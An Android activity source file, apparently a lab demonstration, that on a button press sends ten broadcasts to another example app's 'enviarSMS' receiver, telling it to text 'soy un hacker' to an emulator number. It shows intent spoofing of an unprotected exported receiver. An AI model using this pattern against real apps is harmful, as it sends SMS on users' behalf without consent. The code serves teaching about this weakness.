package com.example.appb;

import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button button = findViewById(R.id.main_activity_button);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                for (int i = 0; i < 10; i++) {
                    Intent intent = new Intent("com.example.smssender.enviarSMS");
                    intent.putExtra("numero", "5556");
                    intent.putExtra("mensaje", "soy un hacker");
                    getApplicationContext().sendBroadcast(intent);
                }
                Toast.makeText(getBaseContext(),"mensaje enviado",Toast.LENGTH_LONG).show();
            }
        });
    }
}
